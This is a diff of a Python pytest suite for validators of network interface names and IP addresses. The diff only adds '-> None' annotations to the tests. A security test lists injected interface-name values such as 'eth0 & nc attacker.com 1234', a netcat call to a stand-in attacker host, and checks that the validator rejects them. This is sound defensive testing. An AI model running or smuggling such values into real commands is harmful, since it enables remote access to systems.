@@ -32,7 +32,7 @@ class TestValidateInterfaceName:
         "pvpnksintrf0",
         "proton0",
     ])
-    def test_valid_standard_names(self, name):
+    def test_valid_standard_names(self, name) -> None:
         """Test standard valid interface names."""
         assert validate_interface_name(name) is True
 
@@ -47,17 +47,17 @@ class TestValidateInterfaceName:
         "docker_bridge", # Underscore
         "my_net.100",    # Combination
     ])
-    def test_valid_special_characters(self, name):
+    def test_valid_special_characters(self, name) -> None:
         """Test valid special characters in interface names."""
         assert validate_interface_name(name) is True
 
-    def test_valid_max_length(self):
+    def test_valid_max_length(self) -> None:
         """Test maximum valid length (64 characters)."""
         assert validate_interface_name("a" * 64) is True
         assert validate_interface_name("eth" + "0" * 61) is True
         assert validate_interface_name("x" * 63 + "0") is True
 
-    def test_valid_minimum_length(self):
+    def test_valid_minimum_length(self) -> None:
         """Test minimum valid length (1 character)."""
         assert validate_interface_name("a") is True
         assert validate_interface_name("0") is True
@@ -67,11 +67,11 @@ class TestValidateInterfaceName:
         " ",             # Single space
         "   ",           # Multiple spaces
     ])
-    def test_invalid_empty_or_whitespace(self, name):
+    def test_invalid_empty_or_whitespace(self, name) -> None:
         """Test empty or whitespace-only strings are invalid."""
         assert validate_interface_name(name) is False
 
-    def test_invalid_too_long(self):
+    def test_invalid_too_long(self) -> None:
         """Test names over 64 characters are invalid."""
         assert validate_interface_name("a" * 65) is False
         assert validate_interface_name("a" * 100) is False
@@ -107,7 +107,7 @@ class TestValidateInterfaceName:
         "eth`0",         # Backtick
         "eth~0",         # Tilde
     ])
-    def test_invalid_characters(self, name):
+    def test_invalid_characters(self, name) -> None:
         """Test invalid characters are rejected."""
         assert validate_interface_name(name) is False
 
@@ -124,7 +124,7 @@ class TestValidateInterfaceName:
         "eth0\n/bin/bash",
         "eth0 & nc attacker.com 1234",
     ])
-    def test_security_injection_attempts(self, injection):
+    def test_security_injection_attempts(self, injection) -> None:
         """Test command injection attempts are blocked."""
         assert validate_interface_name(injection) is False
 
@@ -135,7 +135,7 @@ class TestValidateInterfaceName:
         "eth0\x01ctrl",  # Control character
         "🔥eth0",        # Emoji
     ])
-    def test_invalid_unicode_and_control(self, name):
+    def test_invalid_unicode_and_control(self, name) -> None:
         """Test non-ASCII and control characters are rejected."""
         assert validate_interface_name(name) is False
 
@@ -154,7 +154,7 @@ class TestIsValidIPv4:
         "100.85.0.1",
         "10.42.0.1",
     ])
-    def test_valid_standard_addresses(self, address):
+    def test_valid_standard_addresses(self, address) -> None:
         """Test standard valid IPv4 addresses."""
         assert is_valid_ipv4(address) is True
 
@@ -168,11 +168,11 @@ class TestIsValidIPv4:
         "224.0.0.0",         # Multicast
         "239.255.255.255",   # Multicast end
     ])
-    def test_valid_edge_cases(self, address):
+    def test_valid_edge_cases(self, address) -> None:
         """Test edge case valid addresses."""
         assert is_valid_ipv4(address) is True
 
-    def test_invalid_none(self):
+    def test_invalid_none(self) -> None:
         """Test None input is invalid."""
         assert is_valid_ipv4(None) is False
 
@@ -181,7 +181,7 @@ class TestIsValidIPv4:
         " ",
         "   ",
     ])
-    def test_invalid_empty_or_whitespace(self, address):
+    def test_invalid_empty_or_whitespace(self, address) -> None:
         """Test empty or whitespace strings are invalid."""
         assert is_valid_ipv4(address) is False
 
@@ -192,7 +192,7 @@ class TestIsValidIPv4:
         "192.168.1.1.1",     # Too many octets
         "192.168.1.1.1.1",   # Too many octets
     ])
-    def test_invalid_octet_count(self, address):
+    def test_invalid_octet_count(self, address) -> None:
         """Test invalid octet counts are rejected."""
         assert is_valid_ipv4(address) is False
 
@@ -205,7 +205,7 @@ class TestIsValidIPv4:
         "192.168.-1.1",      # Negative octet
         "-1.168.1.1",        # Negative first octet
     ])
-    def test_invalid_octet_range(self, address):
+    def test_invalid_octet_range(self, address) -> None:
         """Test out-of-range octets are rejected."""
         assert is_valid_ipv4(address) is False
 
@@ -216,7 +216,7 @@ class TestIsValidIPv4:
         "192.168.1.1a",      # Letter suffix
         "192.168.1.0x10",    # Hex notation
     ])
-    def test_invalid_non_numeric(self, address):
+    def test_invalid_non_numeric(self, address) -> None:
         """Test non-numeric octets are rejected."""
         assert is_valid_ipv4(address) is False
 
@@ -226,7 +226,7 @@ class TestIsValidIPv4:
         "fe80::1",
         "2607:f8b0:4004:814::200e",
     ])
-    def test_invalid_ipv6_addresses(self, address):
+    def test_invalid_ipv6_addresses(self, address) -> None:
         """Test IPv6 addresses are rejected."""
         assert is_valid_ipv4(address) is False
 
@@ -239,7 +239,7 @@ class TestIsValidIPv4:
         "192.168.1.1\n",     # Newline
         "192.168.1.1\t",     # Tab
     ])
-    def test_invalid_whitespace(self, address):
+    def test_invalid_whitespace(self, address) -> None:
         """Test addresses with whitespace are rejected."""
         assert is_valid_ipv4(address) is False
 
@@ -257,7 +257,7 @@ class TestIsValidIPv6:
         "fdeb:446c:912d:8da::",
         "2a02:6ea0:c501:6262::12",
     ])
-    def test_valid_standard_addresses(self, address):
+    def test_valid_standard_addresses(self, address) -> None:
         """Test standard valid IPv6 addresses."""
         assert is_valid_ipv6(address) is True
 
@@ -268,7 +268,7 @@ class TestIsValidIPv6:
         "fe80::1%1",
         "2001:db8::1%eth0",
     ])
-    def test_valid_with_zone_identifier(self, address):
+    def test_valid_with_zone_identifier(self, address) -> None:
         """Test zone identifiers are stripped and address is valid."""
         assert is_valid_ipv6(address) is True
 
@@ -282,11 +282,11 @@ class TestIsValidIPv6:
         "fe80::",                  # Link-local prefix
         "ff00::",                  # Multicast prefix
     ])
-    def test_valid_edge_cases(self, address):
+    def test_valid_edge_cases(self, address) -> None:
         """Test edge case valid addresses."""
         assert is_valid_ipv6(address) is True
 
-    def test_invalid_none(self):
+    def test_invalid_none(self) -> None:
         """Test None input is invalid."""
         assert is_valid_ipv6(None) is False
 
@@ -295,7 +295,7 @@ class TestIsValidIPv6:
         " ",
         "   ",
     ])
-    def test_invalid_empty_or_whitespace(self, address):
+    def test_invalid_empty_or_whitespace(self, address) -> None:
         """Test empty or whitespace strings are invalid."""
         assert is_valid_ipv6(address) is False
 
@@ -305,7 +305,7 @@ class TestIsValidIPv6:
         "2001:xyz::1",          # Invalid hex in group
         "2001:db8:12345::1",    # Group > 4 hex digits
     ])
-    def test_invalid_hex_digits(self, address):
+    def test_invalid_hex_digits(self, address) -> None:
         """Test invalid hex digits are rejected."""
         assert is_valid_ipv6(address) is False
 
@@ -314,7 +314,7 @@ class TestIsValidIPv6:
         "::1::2",               # Double ::
         "2001::db8::1",         # Double ::
     ])
-    def test_invalid_double_compression(self, address):
+    def test_invalid_double_compression(self, address) -> None:
         """Test double :: compression is rejected."""
         assert is_valid_ipv6(address) is False
 
@@ -323,11 +323,11 @@ class TestIsValidIPv6:
         "8.8.8.8",
         "10.0.0.1",
     ])
-    def test_invalid_ipv4_addresses(self, address):
+    def test_invalid_ipv4_addresses(self, address) -> None:
         """Test IPv4 addresses are rejected."""
         assert is_valid_ipv6(address) is False
 
-    def test_zone_identifier_stripping(self):
+    def test_zone_identifier_stripping(self) -> None:
         """Test zone identifier is properly stripped before validation."""
         # Valid address with zone
         assert is_valid_ipv6("fe80::1%eth0") is True
@@ -344,7 +344,7 @@ class TestIsValidIPv6:
         "fe80::1\n",            # Newline
         "fe80::1\t",            # Tab
     ])
-    def test_invalid_whitespace(self, address):
+    def test_invalid_whitespace(self, address) -> None:
         """Test addresses with whitespace are rejected."""
         assert is_valid_ipv6(address) is False
 
@@ -360,7 +360,7 @@ class TestIsValidIP:
         "0.0.0.0",
         "255.255.255.255",
     ])
-    def test_valid_ipv4(self, address):
+    def test_valid_ipv4(self, address) -> None:
         """Test IPv4 addresses are recognized."""
         assert is_valid_ip(address) is True
 
@@ -372,11 +372,11 @@ class TestIsValidIP:
         "2607:f8b0:4004:814::200e",
         "::",
     ])
-    def test_valid_ipv6(self, address):
+    def test_valid_ipv6(self, address) -> None:
         """Test IPv6 addresses are recognized."""
         assert is_valid_ip(address) is True
 
-    def test_invalid_none(self):
+    def test_invalid_none(self) -> None:
         """Test None input is invalid."""
         assert is_valid_ip(None) is False
 
@@ -390,7 +390,7 @@ class TestIsValidIP:
         "hostname.example.com",
         "www.google.com",
     ])
-    def test_invalid_format(self, address):
+    def test_invalid_format(self, address) -> None:
         """Test completely invalid formats are rejected."""
         assert is_valid_ip(address) is False
 
@@ -401,11 +401,11 @@ class TestIsValidIP:
         "127.0.0.1",        # IPv4 loopback
         "fe80::1%eth0",     # IPv6 with zone
     ])
-    def test_accepts_either_version(self, address):
+    def test_accepts_either_version(self, address) -> None:
         """Test function accepts both IPv4 and IPv6."""
         assert is_valid_ip(address) is True
 
-    def test_rejects_both_invalid(self):
+    def test_rejects_both_invalid(self) -> None:
         """Test function rejects addresses invalid as both IPv4 and IPv6."""
         assert is_valid_ip("not.an.ip.address") is False
         assert is_valid_ip("999.999.999.999") is False
